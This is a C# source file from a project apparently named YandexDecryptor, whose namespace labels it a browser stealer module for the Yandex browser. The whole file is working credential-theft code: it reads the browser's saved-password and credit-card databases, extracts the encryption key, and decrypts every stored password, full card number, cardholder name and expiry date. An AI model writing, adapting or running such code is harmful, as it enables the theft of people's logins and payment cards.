using System;
using System.IO;
using System.Text;
using System.Collections.Generic;

using YandexDecryptor.Helpers;
using YandexDecryptor.Helpers.Json;
using YandexDecryptor.Stealer.Browsers.Chromium;

namespace YandexDecryptor.Stealer.Browsers.Yandex
{
    internal class Yandex : Chromium.Chromium
    {
        public Yandex(string userData) : base(userData)
        {
        }

        public override IEnumerable<Models.PasswordEntry> GetPasswords(Models.BrowserProfile profile)
        {
            string dbName = IOUtils.CombinePaths(userDataPath.FullName, profile.InternalName, "Ya Passman Data");
            if (File.Exists(dbName))
            {
                byte[] encryptionKey = LocalEncryptor.ExtractEncryptionKey(dbName, this.localstate.EncryptionKey);
                if (encryptionKey == null || encryptionKey.Length != 32)
                {
                    yield break;
                }

                SQLiteHandler sql = new SQLiteHandler(dbName);
                if (sql.ReadTable("logins"))
                {
                    for (int r = 0; r < sql.GetRowCount(); r++)
                    {
                        string
                            url = sql.GetValue(r, "origin_url"),
                            username_element = sql.GetValue(r, "username_element"),
                            username_value = IOUtils.ToUtf8(sql.GetValue(r, "username_value")),
                            password_element = sql.GetValue(r, "password_element"),
                            signon_realm = sql.GetValue(r, "signon_realm");

                        byte[] password_value = sql.GetBytes(r, "password_value");

                        if (password_value.Length > 0)
                        {
                            byte[] decrypted = AuthenticatedData.Decrypt(encryptionKey, password_value, url, username_element, password_element, username_value, signon_realm);
                            
                            yield return new Models.PasswordEntry()
                            {
                                Hostname = url,
                                Username = username_value,
                                Password = Encoding.UTF8.GetString(decrypted),
                                Application = GetName(),
                                Profile = profile.Name,
                            };
                        }
                    }
                }
            }
        }


        public override IEnumerable<Models.CreditCard> GetCards(Models.BrowserProfile profile)
        {
            string dbName = IOUtils.CombinePaths(userDataPath.FullName, profile.InternalName, "Ya Credit Cards");
            if (File.Exists(dbName))
            {
                byte[] encryptionKey = LocalEncryptor.ExtractEncryptionKey(dbName, this.localstate.EncryptionKey);
                if (encryptionKey == null || encryptionKey.Length != 32)
                {
                    yield break;
                }

                SQLiteHandler sql = new SQLiteHandler(dbName);
                if (sql.ReadTable("records"))
                {
                    for (int r = 0; r < sql.GetRowCount(); r++)
                    {
                        byte[] guid = sql.GetBytes(r, "guid");
                        byte[] privateData = sql.GetBytes(r, "private_data");
                        string publicData = sql.GetValue(r, "public_data");

                        // Извлекаем nonce - первые 12 байт
                        byte[] nonce = new byte[12];
                        Array.Copy(privateData, 0, nonce, 0, 12);

                        // Извлекаем encrypted_data - байты с 12 до (длина - 16)
                        int encryptedDataLength = privateData.Length - 12 - 16;
                        byte[] encryptedData = new byte[encryptedDataLength];
                        Array.Copy(privateData, 12, encryptedData, 0, encryptedDataLength);

                        // Извлекаем tag - последние 16 байт
                        byte[] tag = new byte[16];
                        Array.Copy(privateData, privateData.Length - 16, tag, 0, 16);

                        byte[] decrypted = AesGcm.Decrypt(encryptionKey, nonce, guid, encryptedData, tag);

                        JSONNode privateJson = JSONNode.Parse(Encoding.UTF8.GetString(decrypted));
                        JSONNode publicJson = JSONNode.Parse(publicData);

                        yield return new Models.CreditCard()
                        {
                            ExpMonth = publicJson["expire_date_month"].Value,
                            ExpYear = publicJson["expire_date_year"].Value,
                            Name = IOUtils.ToUtf8(publicJson["card_holder"].Value),
                            Number = privateJson["full_card_number"].Value,
                        };

                    }
                }
            }
        
        }
    }
}
